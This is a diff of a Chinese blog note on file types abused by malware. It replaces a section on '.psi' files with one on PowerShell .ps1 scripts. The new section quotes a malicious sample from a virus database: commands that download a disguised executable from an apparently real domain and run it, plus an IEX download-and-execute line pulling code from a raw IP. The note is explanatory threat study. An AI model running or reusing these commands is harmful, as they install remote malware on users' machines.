@@ -114,9 +114,17 @@ Windows脚本文件，也是一类可以执行的文件，[这篇文章](https:/
 
 <img src="https://my-picbed.oss-cn-hangzhou.aliyuncs.com/202209020935572.jpeg" alt="WSF文件内容" style="zoom:50%;" />
 
-### PSI
 
-又是一个从来没有见过的后缀名，[这篇文章](https://www.filetypeadvisor.com/zh-cn/extension/psi)说psi有多种不同的含义，不清楚具体是哪一种会被攻击者利用。
+
+### PS1
+
+刚开始把这个文件的后缀名认成了PSI，结果一看是PS1文件。这类文件是Windows上power shell的脚本文件，包含了一系列可以执行的脚本。看了一下病毒库，ps1文件也是重灾区之一。比如下面这一段脚本，所执行的就是从某个IP下载恶意程序：
+
+```powershell
+curl https://fastaccesone.com/load/ntc_claim.pdf -o C:\users\public\ntc_claim.pdf
+C:\users\public\ntc_claim.pdf
+IEX ((new-object net.webclient).downloadstring('http://146.70.87.120:5000/work443'))
+```
 
 ## 其他文件
 
